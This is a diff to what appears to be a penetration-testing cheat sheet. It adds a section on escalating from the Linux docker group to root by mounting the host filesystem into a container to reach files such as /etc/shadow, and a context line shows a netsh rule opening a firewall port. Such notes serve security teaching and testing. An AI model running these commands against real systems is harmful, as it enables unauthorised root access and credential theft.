@@ -29,9 +29,11 @@ Table of Contents
       * [Using BloodHound](#using-bloodhound)
       * [From DNSAdmin group to Administrators](#from-dnsadmin-to-administrator)
       * [From Exchange Windows Permissions group to Administrators](#from-exchange-windows-permissions-group-to-administrators)
-   * [Post Explotation](#post-explotation)
+   * [Post Explotation Windows](#post-explotation-windows)
       * [Extract locally saved NTLM from Windows](#extract-locally-saved-ntlm-from-windows)
       * [Adding Firewall rules](#adding-firewall-rules)
+   * [PrivEsc on Linux](#privesc-on-linux)
+      * [From Docker group to root](#from-docker-group-to-root)
    * [Pivoting](#pivoting)
       * [Local Port Forward with Netsh](#local-port-forward-with-netsh)
    * [EternalBlue Vulnerabilities exploitation](#eternalblue-vulnerabilities-exploitation)
@@ -278,6 +280,16 @@ The following command will create a rule in the Firewall list that will allow th
 ```cmd
 netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=[LOCAL-IP] localport=4445 action=allow
 ```
+
+# From Docker group to root
+```bash
+# First look for which dockers are installed in the system
+docker image ls
+
+# Then, we run any of the images and we can mount the entire victim server file system into any path of the deployed docker, in this way:
+docker run -v /:/mnt/pwned -ti [IMAGE_NAME]
+
+# Once executed, we should see a shell like this "root@2eb410b54824". At that step we have only to navigate to "/mnt/pwned" and we will see the target victim file system. So we can see privileges files like /etc/shadow.
 
 # Pivoting
 In the current part there are explained some pivoting techniques that have been useful in many situations.
